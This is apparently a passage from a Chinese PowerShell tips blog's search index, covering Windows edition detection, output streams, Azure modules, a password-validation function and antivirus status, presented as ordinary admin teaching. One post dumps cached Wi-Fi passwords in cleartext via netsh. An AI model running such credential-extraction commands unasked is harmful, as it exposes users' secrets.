{'PRODUCT_THINPC'} 88 {'PRODUCT_EMBEDDED_A'} 89 {'PRODUCT_EMBEDDED_INDUSTRY'} 90 {'PRODUCT_EMBEDDED_E'} 91 {'PRODUCT_EMBEDDED_INDUSTRY_E'} 92 {'PRODUCT_EMBEDDED_INDUSTRY_A_E'} 95 {'PRODUCT_STORAGE_WORKGROUP_EVALUATION_SERVE'} 96 {'PRODUCT_STORAGE_STANDARD_EVALUATION_SERVER'} 97 {'PRODUCT_CORE_ARM'} 98 {'PRODUCT_CORE_N'} 99 {'PRODUCT_CORE_COUNTRYSPECIFIC'} 100 {'PRODUCT_CORE_SINGLELANGUAGE'} 101 {'PRODUCT_CORE'} 103 {'PRODUCT_PROFESSIONAL_WMC'} 105 {'PRODUCT_EMBEDDED_INDUSTRY_EVAL'} 106 {'PRODUCT_EMBEDDED_INDUSTRY_E_EVAL'} 107 {'PRODUCT_EMBEDDED_EVAL'} 108 {'PRODUCT_EMBEDDED_E_EVAL'} 109 {'PRODUCT_NANO_SERVER'} 110 {'PRODUCT_CLOUD_STORAGE_SERVER'} 111 {'PRODUCT_CORE_CONNECTED'} 112 {'PRODUCT_PROFESSIONAL_STUDENT'} 113 {'PRODUCT_CORE_CONNECTED_N'} 114 {'PRODUCT_PROFESSIONAL_STUDENT_N'} 115 {'PRODUCT_CORE_CONNECTED_SINGLELANGUAGE'} 116 {'PRODUCT_CORE_CONNECTED_COUNTRYSPECIFIC'} 117 {'PRODUCT_CONNECTED_CAR'} 118 {'PRODUCT_INDUSTRY_HANDHELD'} 119 {'PRODUCT_PPI_PRO'} 120 {'PRODUCT_ARM64_SERVER'} 121 {'PRODUCT_EDUCATION'} 122 {'PRODUCT_EDUCATION_N'} 123 {'PRODUCT_IOTUAP'} 124 {'PRODUCT_CLOUD_HOST_INFRASTRUCTURE_SERVER'} 125 {'PRODUCT_ENTERPRISE_S'} 126 {'PRODUCT_ENTERPRISE_S_N'} 127 {'PRODUCT_PROFESSIONAL_S'} 128 {'PRODUCT_PROFESSIONAL_S_N'} 129 {'PRODUCT_ENTERPRISE_S_EVALUATION'} 130 {'PRODUCT_ENTERPRISE_S_N_EVALUATION'} 135 {'PRODUCT_HOLOGRAPHIC'} 138 {'PRODUCT_PRO_SINGLE_LANGUAGE'} 139 {'PRODUCT_PRO_CHINA'} 140 {'PRODUCT_ENTERPRISE_SUBSCRIPTION'} 141 {'PRODUCT_ENTERPRISE_SUBSCRIPTION_N'} 143 {'PRODUCT_DATACENTER_NANO_SERVER'} 144 {'PRODUCT_STANDARD_NANO_SERVER'} 145 {'PRODUCT_DATACENTER_A_SERVER_CORE'} 146 {'PRODUCT_STANDARD_A_SERVER_CORE'} 147 {'PRODUCT_DATACENTER_WS_SERVER_CORE'} 148 {'PRODUCT_STANDARD_WS_SERVER_CORE'} 149 {'PRODUCT_UTILITY_VM'} 159 {'PRODUCT_DATACENTER_EVALUATION_SERVER_CORE'} 160 {'PRODUCT_STANDARD_EVALUATION_SERVER_CORE'} 161 {'PRODUCT_PRO_WORKSTATION'} 162 {'PRODUCT_PRO_WORKSTATION_N'} 164 {'PRODUCT_PRO_FOR_EDUCATION'} 165 {'PRODUCT_PRO_FOR_EDUCATION_N'} 168 {'PRODUCT_AZURE_SERVER_CORE'} 169 {'PRODUCT_AZURE_NANO_SERVER'} 171 {'PRODUCT_ENTERPRISEG'} 172 {'PRODUCT_ENTERPRISEGN'} 175 {'PRODUCT_SERVERRDSH'} 178 {'PRODUCT_CLOUD'} 179 {'PRODUCT_CLOUDN'} 180 {'PRODUCT_HUBOS'} 182 {'PRODUCT_ONECOREUPDATEOS'} 183 {'PRODUCT_CLOUDE'} 184 {'PRODUCT_ANDROMEDA'} 185 {'PRODUCT_IOTOS'} 186 {'PRODUCT_CLOUDEN'} default {&quot;$value&quot;} } }}Get-CimInstance -ClassName Win32_OperatingSystem | Select-Object -Property Caption, OperatingSystemSKU, $OperatingSystemSKU 输出将添加一个具有友好名称的新 OperatingSystemSKUText 属性： Caption OperatingSystemSKU OperatingSystemSKUText ------- ------------------ ---------------------- Microsoft Windows 10 Pro 48 PRODUCT_PROFESSIONAL","link":"/2020/07/03/identifying-windows-type/"},{"title":"PowerShell 技能连载 - 识别操作系统详细信息","text":"当您查询操作系统详细信息时，WMI 会返回一个数字： 123PS&gt; Get-CimInstance -ClassName Win32_OperatingSystem | Select-Object -ExpandProperty SuiteMask272 SuiteMask 实际上是一个位掩码，其中每个位代表一个特定的细节。要将其转换为可读的文本，请使用标志枚举： 12345678910111213141516171819202122232425$SuiteMask = @{ Name = 'SuiteMaskText' Expression = { [Flags()] Enum EnumSuiteMask { SmallBusinessServer = 1 Server2008Enterprise = 2 BackOfficeComponents = 4 CommunicationsServer = 8 TerminalServices = 16 SmallBusinessServerRestricted = 32 WindowsEmbedded = 64 DatacenterEdition = 128 TerminalServicesSingleSession = 256 HomeEdition = 512 WebServerEdition = 1024 StorageServerEdition = 8192 ComputeClusterEdition = 16384 } [EnumSuiteMask][int]$_.SuiteMask }}Get-CimInstance -ClassName Win32_OperatingSystem | Select-Object -Property Caption, SuiteMask, $SuiteMask 这将添加一个计算得出的 SuiteMaskText 属性，该属性列出了已安装的操作系统扩展： Caption SuiteMask SuiteMaskText ------- --------- ------------- Microsoft Windows 10 Pro 272 TerminalServices, TerminalServicesSingleSession","link":"/2020/07/07/identifying-operating-system-details/"},{"title":"PowerShell 技能连载 - 忽略（任何）输出","text":"无论您做什么，PowerShell中都有（少量）命令可将信息输出到控制台。无论流重定向或赋值给 $null 都不能禁止这类命令输出，例如： 1PS&gt; $null = Get-WindowsUpdateLog *&gt;&amp;1 即使所有输出流都被丢弃，Get-WindowsUpdateLog cmdlet 仍会将大量信息写入控制台。 如果遇到这种情况，最后的方法是暂时禁用内部命令 Out-Default，如下所示： 1234567891011# temporarily overwrite Out-Defaultfunction Out-Default {}# run your code (guaranteed no output)Get-WindowsUpdateLog# test any other direct console write[Console]::WriteLine(&quot;Hello&quot;)# restore Out-DefaultRemove-Item -Path function:Out-Default","link":"/2020/07/09/discarding-any-output/"},{"title":"PowerShell 技能连载 - 丢弃数据流","text":"PowerShell 通过不同的流输出信息。警告写入到与输出不同的流中，而错误也写入不同的流。每个流都有一个唯一的数字标识符： IDStream1Output2Error3Warning4Verbose5Debug6Information 如果要丢弃某个流，可以使用重定向运算符（“&gt;”）并将流重定向到 $null。此行代码将丢弃任何错误或警告消息： 1Get-Process -FileVersionInfo 2&gt;$null 3&gt;$null","link":"/2020/07/13/discarding-streams/"},{"title":"PowerShell 技能连载 - 禁止 Write-Host 语句输出","text":"Write-Host 是将信息输出给用户的非常有用的 cmdlet，因为此输出不能被丢弃： 1234567891011function Invoke-Test{ &quot;Regular Output&quot; Write-Host &quot;You always see me!&quot;}# both showInvoke-Test# Write-Host still shows$result = Invoke-Test 不过从 PowerShell 5开始，引擎发生了悄然的变化。Write-Host 产生的输出现在也由流系统控制，并且 Write-Host 与 Write-Information 共享新的信息流。 如果要隐藏 Write-Host 发出的消息，只需将 #6 流重定向到 $null： 1PS&gt; $result = Invoke-Test 6&gt;$null 有关流和重定向的更多信息，请访问 https://powershell.one/code/9.html。","link":"/2020/07/15/silencing-write-host-statements/"},{"title":"PowerShell 技能连载 - 重定向流","text":"PowerShell 将输出信息写入六个不同的流，并且仅将输出流分配给变量： 12345678910111213function Invoke-Test{ &quot;Regular Output&quot; Write-Host &quot;You always see me!&quot; Write-Information &quot;Info&quot; Write-Warning &quot;Warning&quot; Write-Error &quot;Error&quot; Write-Debug &quot;Debug&quot; Write-Verbose &quot;Verbose&quot; Write-Output &quot;Output&quot;}$result = Invoke-Test 其余所有流要么显示在控制台中，要么隐藏在控制台中，具体取决于其适当的首选项变量的设置： 123456789PS&gt; Get-Variable -Name *preference -Exclude *confirm*,*whatif*,*progress*Name Value---- -----DebugPreference SilentlyContinueErrorActionPreference ContinueInformationPreference SilentlyContinueVerbosePreference SilentlyContinueWarningPreference Continue 有时，可能还需要捕获其他流的输出并对其进行处理，而不是将其输出到控制台。为此，您可以将所有流重定向到输出流，并将总结果捕获到变量中： 1234567891011121314function Invoke-Test{ &quot;Regular Output&quot; Write-Host &quot;You always see me!&quot; Write-Information &quot;Info&quot; Write-Warning &quot;Warning&quot; Write-Error &quot;Error&quot; Write-Debug &quot;Debug&quot; Write-Verbose &quot;Verbose&quot; Write-Output &quot;Output&quot;}$all = Invoke-Test *&gt;&amp;1 现在，此变量包含所有流的组合输出。为了单独处理流，您可能需要按类型对内容进行分组： 123456789101112131415161718PS&gt; $groups = $all | Group-Object -Property { $_.GetType().Name } -AsHashTable -AsStringPS&gt; $groupsName Value---- -----WarningRecord {Warning}InformationRecord {You always see me!, Info}ErrorRecord {Error}String {Regular Output, Output}PS&gt; $groups.WarningRecordWARNING: WarningPS&gt; $groups.InformationRecordYou always see me!Info","link":"/2020/07/17/redirecting-streams/"},{"title":"PowerShell 技能连载 - 显示 Wi-Fi 配置","text":"PowerShell 不仅限于执行 cmdlet，还可以运行可执行文件。例如，没有内置的 cmdlet 可以列出现有的 Wi-Fi 配置文件，但是 netsh.exe 可以提供以下信息： 1PS&gt; netsh wlan show profiles 使用 Select-String 仅识别与模式匹配的输出行（冒号后面跟着文本），然后使用 -split 运算符在以 “: “ 分隔字符串，并返回最后一个数组元素 (index -1) 得到配置文件名称： 123PS&gt; netsh wlan show profiles | Select-String &quot;:(.{1,})$&quot; | ForEach-Object { ($_.Line -split ': ')[-1] }","link":"/2020/07/21/showing-wi-fi-profiles/"},{"title":"PowerShell 技能连载 - 导出 Wi-Fi 密码","text":"在上一个技巧中，我们使用 netsh.exe 转储 Wi-Fi 配置。让我们更进一步，提取缓存的密码： 123456789# get cleartext password for each profileForeach ($profile in $profiles){ $password = (@(netsh wlan show profile name=&quot;$profile&quot; key=clear) -like '*Key Content*' -split ': ')[-1] [PSCustomObject]@{ Profile = $profile Password = $password }} 这只是一个示例，演示了 PowerShell 如何处理由控制台应用程序（例如 netsh.exe）返回的字符串信息。您也有可能遇到挑战：当 Wi-Fi 配置名称使用特殊字符（例如撇号）时，可能无法通过 netsh.exe 进行检索。","link":"/2020/07/23/dumping-wi-fi-passwords/"},{"title":"PowerShell 技能连载 - 显示 Wi-Fi 的 SSID","text":"在上一个技巧中，我们说明了如何使用 netsh.exe 转储所有 Wi-Fi 配置名称。通常，配置名称和 SSID 是相同的。但是，如果您对真正的 Wi-Fi SSID 名称感兴趣，则可以通过转储单个配置文件并使用通配符作为配置文件名称来直接查询这些名称： 123PS&gt; netsh wlan show profile name=&quot;*&quot; key=clear | Where-Object { $_ -match &quot;SSID name\\s*:\\s(.*)$&quot;} | ForEach-Object { $matches[1].Replace('&quot;','') }","link":"/2020/07/27/showing-wi-fi-ssids/"},{"title":"PowerShell 技能连载 - 添加 Azure 的 PowerShell 命令","text":"要在 Azure 云中管理和自动化操作您的资产，可以轻松安装免费的 PowerShell 模块，该模块带有大量新的 PowerShell 命令： 12345if ($PSVersionTable.PSEdition -eq 'Desktop' -and (Get-Module -Name AzureRM -ListAvailable)) { Write-Warning 'AzureRM and Az modules installed at the same time is not supported.')} else { Install-Module -Name Az -AllowClobber -Scope CurrentUser} 在 Windows PowerShell 上，如果您已经安装了较旧的 “AzureRM” 模块，不建议再安装 “Az” 模块，因此上面的代码检查 “AzureRM” 模块是否存在，仅当 Windows PowerShell 中不存在该模块时下载并安装新的 “Az” 模块。 “Az” 模块由许多嵌套模块组成，并且都已安装。此过程可能需要几分钟。安装模块后，您可以查看所有新模块以及它们带来的命令： 12345# listing all new commandsGet-Command -Module Az.*# listing all new modulesGet-Module -Name Az.* -ListAvailable 第一步是连接到您的Azure帐户： 1PS&gt; Connect-AzAccount 如果您有多个 Azure 订阅，则可以像这样选择一个订阅： 1Get-AzSubscription | Out-GridView -Title 'Subscription?' -OutputMode Single | Select-AzSubscription 连接后，您就可以开始使用新命令了。作为初学者，您应该专注于动词为 “Get” 的命令，这样您就不会弄乱任何东西： 12345# listing all Azure VMsGet-AzVM# listing all safe Get-* cmdletsGet-Command -Verb Get -Module Az.* 若要了解您可以使用新的 Azure 命令做什么，请在浏览器中访问扩展的联机帮助： 1Start-Process -FilePath https://docs.microsoft.com/en-us/powershell/azure/new-azureps-module-az","link":"/2020/07/29/adding-powershell-commands-for-azure/"},{"title":"PowerShell 技能连载 - 添加 SharePoint 的 PowerShell 命令","text":"通过 PowerShell 库，可以轻松访问其他 PowerShell 命令。例如，您可以下载并安装 SharePoint 的命令扩展，并使用 PowerShell 来自动化 SharePoint 网站： 1234Install-Module -Name Microsoft.Online.SharePoint.PowerShell -Scope CurrentUser -Force# listing all new SharePoint commandsGet-Command -Module Microsoft.Online.SharePoint.PowerShell 在 PowerShell 库中，还有许多用于处理 SharePoint 的 PowerShell 模块。Find-Module 可帮助您确定更多有用的资源： 1Find-Module -Name *sharepoint* 知道您感兴趣的模块名称后，请使用 Install-Module 下载并安装它，或使用 Save-Module 将其下载到您选择的隔离文件夹中。这样，您可以调查源代码并确定是否信任该代码。 要了解有关 SharePoint 的 PowerShell 命令的更多信息，请访问官方帮助页面： 1Start-Process -FilePath https://docs.microsoft.com/en-us/powershell/sharepoint/sharepoint-online/connect-sharepoint-online?view=sharepoint-ps","link":"/2020/07/31/adding-powershell-commands-for-sharepoint/"},{"title":"PowerShell 技能连载 - 详细的电池报告","text":"如果您的笔记本电脑电池电量过低，或者您想调查相关问题，可以通过一种简单的方法来生成大量的电池充电报告。它会准确显示电池的充电时间，电池容量以及电池耗尽的时间。 以下是创建 14 天报告的代码： 1234$path = &quot;$env:temp/battery_report2.html&quot;powercfg /batteryreport /output $Path /duration 14Start-Process -FilePath $Path -WaitRemove-Item -Path $path 请注意，此调用不需要管理员特权（如常所述）。只要确保报告文件是在您具有写权限的位置生成的。","link":"/2020/08/04/sophisticated-battery-report/"},{"title":"PowerShell 技能连载 - 读取 4K 哈希","text":"Windows 操作系统可以通过所谓的 4K 哈希来唯一标识：这是一个特殊的哈希字符串，大小为 4000 字节。您可以将此哈希与 “Windows Autopilot” 一起使用，以添加物理机和虚拟机。 4K 哈希是注册 Windows 机器所需的一条信息，但是它本身也很有趣，它也可以唯一地标识 Windows 操作系统用于其他目的。下面的代码通过 WMI 读取唯一的 4K 哈希（需要管理员特权）： 1234$info = Get-CimInstance -Namespace root/cimv2/mdm/dmmap -Class MDM_DevDetail_Ext01 -Filter &quot;InstanceID='Ext' AND ParentID='./DevDetail'&quot;$4khh = $info.DeviceHardwareData$4khh 由于 Get-CimInstance 支持远程处理，因此您也可以从远程系统（即虚拟机）读取此值。","link":"/2020/08/06/reading-4k-hash/"},{"title":"PowerShell 技能连载 - 验证用户账户密码（第 1 部分）","text":"PowerShell 可以为您测试用户帐户密码。这适用于本地帐户和域帐户。这是一个称为 Test-Password 的示例函数： 12345678910111213141516171819202122232425262728293031323334353637function Test-Password{ param ( [Parameter(Mandatory)] [string] $Domain, [Parameter(Mandatory)] [string] $Username, [Parameter(Mandatory)] [string] $Password ) # load assembly for required system commands Add-Type -AssemblyName System.DirectoryServices.AccountManagement # is this a local user account? $local = $Domain -eq $env:COMPUTERNAME if ($local) { $context = [System.DirectoryServices.AccountManagement.ContextType]::Machine } else { $context = [System.DirectoryServices.AccountManagement.ContextType]::Domain } # test password $PrincipalContext = [System.DirectoryServices.AccountManagement.PrincipalContext]::new($context, $Domain) $PrincipalContext.ValidateCredentials($UserName,$Password)} 它需要域名（或本地计算机名），用户名和密码。密码正确时，该函数返回 $true。 请注意，此处使用的系统方法需要明文密码。输入明文密码并不安全，因此在我们的下一个技巧中，我们将改进以隐藏方式提示密码的功能。","link":"/2020/08/10/validating-user-account-passwords-part-1/"},{"title":"PowerShell 技能连载 - 验证用户账户密码（第 2 部分）","text":"在上一个技巧中，我们展示了 PowerShell 如何验证和测试用户帐户密码，但是该密码是用纯文本形式传入的。让我们进行更改，以使 PowerShell 在输入密码时将其屏蔽。 您可以重用以下用于其他任何 PowerShell 功能的策略，以提示用户输入隐藏的输入。 Here is the function Test-Password:这是 Test-Password 函数： 123456789101112131415161718192021222324252627282930313233343536373839404142function Test-Password{ param ( [Parameter(Mandatory)] [string] $Domain, [Parameter(Mandatory)] [string] $Username, [Parameter(Mandatory)] [SecureString] $Password ) # load assembly for required system commands Add-Type -AssemblyName System.DirectoryServices.AccountManagement # is this a local user account? $local = $Domain -eq $env:COMPUTERNAME if ($local) { $context = [System.DirectoryServices.AccountManagement.ContextType]::Machine } else { $context = [System.DirectoryServices.AccountManagement.ContextType]::Domain } # convert SecureString to a plain text # (the system method requires clear-text) $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($Password) $plain = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR) # test password $PrincipalContext = [System.DirectoryServices.AccountManagement.PrincipalContext]::new($context, $Domain) $PrincipalContext.ValidateCredentials($UserName,$plain)} 运行它时，系统会提示您输入域（输入计算机名称以测试本地帐户）和用户名。密码以星号方式提示。密码正确时，该函数返回 $true，否则返回 $false。 请注意如何将提示的 SecureString 在内部转换为纯文本。每当需要屏蔽的输入框时，都可以使用类型为 SecureString 的必需参数，然后在函数内部将 SecureString 值转换为纯文本。","link":"/2020/08/12/validating-user-account-passwords-part-2/"},{"title":"PowerShell 技能连载 - 验证用户账户密码（第 3 部分）","text":"在前面的部分中，我们创建了 Test-Password 函数，该函数可以测试本地和远程用户的密码。 在最后一部分，我们将错误处理添加到 Test-Password 函数中，以便当用户输入不存在或不可用的域时它可以正常响应： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950function Test-Password{ param ( [Parameter(Mandatory)] [string] $Domain, [Parameter(Mandatory)] [string] $Username, [Parameter(Mandatory)] [SecureString] $Password ) # load assembly for required system commands Add-Type -AssemblyName System.DirectoryServices.AccountManagement # is this a local user account? $local = $Domain -eq $env:COMPUTERNAME if ($local) { $context = [System.DirectoryServices.AccountManagement.ContextType]::Machine } else { $context = [System.DirectoryServices.AccountManagement.ContextType]::Domain } # convert SecureString to a plain text # (the system method requires clear-text) $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($Password) $plain = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR) # test password try { $PrincipalContext = [System.DirectoryServices.AccountManagement.PrincipalContext]::new($context, $Domain) $PrincipalContext.ValidateCredentials($UserName,$plain) } catch [System.DirectoryServices.AccountManagement.PrincipalServerDownException] { throw &quot;Test-Password: Domain '$Domain' not found.&quot; }} 运行此代码后，将有一个新命令 “Test-Password“。运行它时，系统会提示您输入域（或用于测试本地帐户的本地计算机名称），用户名和掩码密码。 下面是在 PowerShell 7 中运行的示例：第一次调用（测试本地帐户）成功，并产生 $true。第二个调用（指定一个不可用的域）失败，并显示一条自定义错误消息： 1234567891011121314151617181920PS C:\\&gt; Test-Passwordcmdlet Test-Password at command pipeline position 1Supply values for the following parameters:Domain: dell7390Username: remotinguser2Password: ***********TruePS C:\\&gt; Test-Passwordcmdlet Test-Password at command pipeline position 1Supply values for the following parameters:Domain: doesnotexistUsername: testuserPassword: ********Exception:Line | 47 | throw &quot;Test-Password: Domain '$Domain' not found.&quot; | ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ | Test-Password: Domain 'doesnotexist' not found.","link":"/2020/08/14/validating-user-account-passwords-part-3/"},{"title":"PowerShell 技能连载 - 动态创建 PowerShell 函数","text":"New-Item 可以在任何PowerShell驱动器上创建新对象，包括功能：具有所有 PowerShell 功能的驱动器。 如果需要，您可以在代码内部动态定义新功能。这些新功能将仅存在于定义它们的作用域内。要使它们成为脚本全局脚本，请添加脚本：作用域标识符。这是一个例子： 12345678910111213function New-DynamicFunction{ # creates a new function dynamically $Name = 'Test-NewFunction' $Code = { &quot;I am a new function defined dynamically.&quot; Write-Host -ForegroundColor Yellow 'I can do whatever you want!' Get-Process } # create new function in function: drive and set scope to &quot;script:&quot; $null = New-Item -Path function: -Name &quot;script:$Name&quot; -Value $Code} 要测试效果，请运行 New-DynamicFunction。完成后，会有一个称为 Test-NewFunction 的新函数： 123456789101112131415161718# this function does not (yet) exist:PS&gt; Test-NewFunctionTest-NewFunction : The term 'Test-NewFunction' is not recognized as the name of a cmdlet, function, scriptfile, or operable program. Check the spelling of the name, or if a path was included, verify that the pathis correct and try again.PS&gt; New-DynamicFunction# now the function exists:PS&gt; Test-NewFunctionI am a new function defined dynamically.I can do whatever you want!Handles NPM(K) PM(K) WS(K) CPU(s) Id SI ProcessName------- ------ ----- ----- ------ -- -- ----------- 219 18 3384 10276 89,52 13088 1 AppleMobileDeviceProcess 574 35 29972 84500 3,50 8548 1 ApplicationFrameHost 147 9 1376 5644 4472 0 armsvc 请注意，我们如何将新功能的代码定义为大括号中的脚本块。这不是必需的。您还可以将其定义为纯文本字符串，这可以为您提供更多灵活性来编写新函数的源代码： 1234567891011$a = &quot;not&quot;$b = &quot;AD&quot;$c = &quot;EP&quot;# use -Force to overwrite existing functions$null = New-Item -Force -Path function: -Name &quot;script:Test-This&quot; -Value @&quot;'Source code can be a string.'$a$c$b&quot;@Test-This 还要注意，除非指定 -Force，否则 New-Item 不会覆盖现有函数。","link":"/2020/08/18/creating-powershell-functions-dynamically/"},{"title":"PowerShell 技能连载 - 加速 PowerShell 远程操作","text":"PowerShell 远程操作功能极其强大：借助 Invoke-Command，您可以将任意 PowerShell 代码发送到一台或多台远程计算机，并在其中并行执行。 在 Windows 服务器上，通常会启用 PowerShell 远程处理，因此您所需要的只是管理员权限。这是一个简单的示例： 1PS&gt; Invoke-Command -ScriptBlock { &quot;I am running on $env:computername!&quot; } -ComputerName server1 -Credential domain\\adminuser 本技巧不是关于设置 PowerShell 远程操作的，因此我们假定上述调用确实对您有效。相反，我们将重点放在 PowerShell 远程操作的最重要瓶颈之一上，以及如何解决它。 这是一个访问远程系统并从 Windows 文件夹中转储 DLL 的代码。使用一个 stopwatch 测量所需时间： 12345678910111213141516# change this to the computer you want to access$computername = 'server123'# ask for a credential that has admin privileges on the target side$cred = Get-Credential -Message &quot;Log on as Administrator to $computername!&quot;# check how long it takes to retrieve information$stopwatch = [System.Diagnostics.Stopwatch]::new()$stopwatch.Start()$result = Invoke-Command -ScriptBlock { Get-ChildItem -Path c:\\windows\\system32 -Filter *.dll} -ComputerName $computername -Credential $cred$stopwatch.Stop()$stopwatch.Elapsed 令人惊讶的是，此代码运行了很长时间。当我们在自己的本地计算机上尝试它时，花费了 95 秒。从 Invoke-Command 返回信息的速度可能非常慢，因为对象需要序列化为 XML 以跨越进程边界，并在它们返回调用者时重新反序列化。 为了加快远程处理速度，请记住这一点，并仅返回尽可能少的信息。通常，信息量很容易减少。 例如，如果您确实需要 Windows 文件夹中所有 DLL 文件的列表，则很可能只需要一些属性，例如 path 和 size。通过添加一个 Select-Object 并指定您真正需要的属性，之前花费了 95 秒的相同代码现在可以在不到一秒钟的时间内运行： 123456789101112131415161718# change this to the computer you want to access$computername = 'server123'# ask for a credential that has admin privileges on the target side$cred = Get-Credential -Message &quot;Log on as Administrator to $computername!&quot;# check how long it takes to retrieve information$stopwatch = [System.Diagnostics.Stopwatch]::new()$stopwatch.Start()$result = Invoke-Command -ScriptBlock { Get-ChildItem -Path c:\\windows\\system32 -Filter *.dll | # REDUCE DATA BY SPECIFYING THE PROPERTIES YOU REALLY NEED! Select-Object -Property FullName, LastWriteTime} -ComputerName $computername -Credential $cred$stopwatch.Stop()$stopwatch.Elapsed","link":"/2020/08/20/speeding-up-powershell-remoting/"},{"title":"PowerShell 技能连载 - 下载有用的脚本","text":"PowerShell Gallery 不仅提供带有新 PowerShell 命令的公共模块，而且还提供公共脚本。在投入时间之前，您可能希望调查是否有人创建了可以执行所需功能的 PowerShell 代码。 这是一个简单的示例，说明了如何通过 PowerShell Gallery 搜索和下载脚本的工作方式： 12345678910111213# create temporary folder$destination = Join-Path -Path $env:temp -ChildPath Scripts$exists = Test-Path -Path $destinationif (!$exists) { $null = New-Item -Path $destination -ItemType Directory }# offer to download scriptsFind-Script -Name Get-* | Select-Object -Property Name, Description | Out-GridView -Title 'Select script to download' -PassThru | ForEach-Object { Save-Script -Path $destination -Name $_.Name -Force $scriptPath = Join-Path -Path $destination -ChildPath &quot;$($_.Name).ps1&quot; ise $scriptPath } 当您运行此代码时，Find-Script 将查找使用 Get 动词的任何脚本。您当然可以更改此设置并搜索您喜欢的任何内容。接下来，所有与您的搜索匹配的脚本都将显示在网格视图窗口中。现在，您可以选择一个或多个听起来很有趣的东西。 然后，PowerShell 将所选脚本下载到一个临时文件夹，然后在 PowerShell ISE 中打开这些脚本。现在，您可以查看源代码并从中选择有用的内容。 注意：由于 Out-GridView 中的 bug，您需要等待所有数据到达后才能选择脚本。如果选择脚本并在 Out-GridView 仍在接收数据的同时单击“确定”，则不会传递任何数据，也不会下载脚本。 要解决此问题，请等待足够长的时间以完全填充网格视图窗口，或者通过首先收集所有数据然后仅在网格视图窗口中显示数据来关闭实时模式： 12345678910111213141516# create temporary folder$destination = Join-Path -Path $env:temp -ChildPath Scripts$exists = Test-Path -Path $destinationif (!$exists) { $null = New-Item -Path $destination -ItemType Directory }# offer to download scriptsWrite-Warning &quot;Retrieving scripts, hang on...&quot;# collecting all results in a variable to work around# Out-GridView bug$all = Find-Script -Name Get-* | Select-Object -Property Name, Description$all | Out-GridView -Title 'Select script to download' -PassThru | ForEach-Object { Save-Script -Path $destination -Name $_.Name -Force $scriptPath = Join-Path -Path $destination -ChildPath &quot;$($_.Name).ps1&quot; ise $scriptPath }","link":"/2020/08/24/downloading-useful-scripts/"},{"title":"PowerShell 技能连载 - 管理自启动项","text":"要在 Windows 上管理自动启动程序，不必费心编写大量脚本。 PowerShell 可以直接打开任务管理器中包含的自动启动管理器，您只需执行以下操作即可： 1PS C:\\&gt; Taskmgr /7 /startup 这将打开一个窗口，并列出所有自动启动程序及其对启动时间的影响。要阻止这些程序中的任何一个自动启动，请单击列表中的一个程序，然后单击右下角的“禁用”按钮。 如果您愿意，可以将命令转换为函数，然后将其放入配置文件脚本中，以备不时之需： 1234function Show-Autostart{ Taskmgr /7 /startup}","link":"/2020/08/26/managing-autostarts/"},{"title":"PowerShell 技能连载 - 删除多个子文件夹","text":"有时，可能有必要删除给定文件夹中的一组子文件夹。这是一段简单的代码，可从文件夹名称列表中删除文件夹。 警告：此代码将删除 $list 中列出的子文件夹，而无需进一步确认。如果子文件夹没有退出，则什么也不会发生。 1234567891011# the folder that contains the subfolders to remove# (adjust to your needs)$parentFolder = $env:userprofile# list of folder names to remove (adjust to your needs)$list = 'scratch', 'temp', 'cache'# delete the folders found in the listGet-ChildItem $parentFolder -Directory | Where-Object name -in $list | Remove-Item -Recurse -Force -Verbose 如果要删除父文件夹内任何位置的子文件夹，请通过向 Get-ChildItem 添加 -Recurse 来扩展搜索以通过子文件夹进行递归。 下面的示例在父文件夹的文件夹结构内的任何位置删除 $list 中的子文件夹。 请注意，这样做可能有风险，因为您现在正在查找可能并不是由您所有并控制的文件夹内的子文件夹，这就是为什么我们向 -Remove-Item 添加 -WhatIf 的原因：该代码实际上不会删除子文件夹，而只是报告其内容完成了。如果您知道自己在做什么，请删除该参数： 123456789# the folder that contains the subfolders to remove$parentFolder = $env:userprofile# list of folder names to remove$list = 'scratch', 'temp', 'cache'# delete the folders found in the listGet-ChildItem $parentFolder -Directory -Recurse | Where-Object name -in $list | Remove-Item -Recurse -Verbose -WhatIf","link":"/2020/08/28/deleting-multiple-subfolders/"},{"title":"PowerShell 技能连载 - 删除 Microsoft Teams 缓存数据","text":"如果您使用 Microsoft Teams 进行视频会议，则有时可能需要清理缓存文件并删除驻留在许多子文件夹中的残留数据。 您可以调整上一个示例中的代码来进行清理： 123456789# the folder that contains the Microsoft Teams data$parentFolder = &quot;$env:userprofile\\AppData\\Roaming\\Microsoft\\Teams\\*&quot;# list of subfolders that cache data$list = 'application cache','blob storage','databases','GPUcache','IndexedDB','Local Storage','tmp'# delete the folders found in the listGet-ChildItem $parentFolder -Directory | Where-Object name -in $list | Remove-Item -Recurse -Verbose 如果您具有管理员权限，并想为所有用户删除缓存的 Microsoft Teams 数据，请按如下所示更改 $parentFolder： 1$parentFolder = &quot;c:\\users\\*\\AppData\\Roaming\\Microsoft\\Teams\\*&quot;","link":"/2020/09/01/deleting-microsoft-teams-cache-data/"},{"title":"PowerShell 技能连载 - 检测已安装的防病毒产品","text":"这行 PowerShell 代码可以帮助您识别 Windows 系统中安装的防病毒产品： 1PS&gt; Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct 添加 -ComputerName 参数以查询远程系统。 请注意，此行仅返回正确注册的防病毒产品。结果看起来类似这样，并为您提供了防病毒产品和安装位置： 1234567displayName : Windows DefenderinstanceGuid : {D68DDC3A-831F-4fae-9E44-DA132C1ACF46}pathToSignedProductExe : windowsdefender://pathToSignedReportingExe : %ProgramFiles%\\Windows Defender\\MsMpeng.exeproductState : 397568timestamp : Wed, 29 Jul 2020 18:37:24 GMTPSComputerName","link":"/2020/09/03/identifying-installed-antivirus-product/"},{"title":"PowerShell 技能连载 - 检测防病毒引擎状态","text":"在上一个技能中，我们学习了如何查询 WMI 来查找 Windows 计算机上存在的防病毒产品： 123$info = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct$info ProductState 属性对其他信息进行编码，告诉您防病毒引擎是否可运行并使用最新的签名。不过该信息是一个数字，并且是一个位标记： 1234PS&gt; $info = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProductPS&gt; $info.productState397568 要解密数字中各个位的含义，可以使用 PowerShell 对枚举类型新支持。定义好位及其含义，并用 [Flags()] 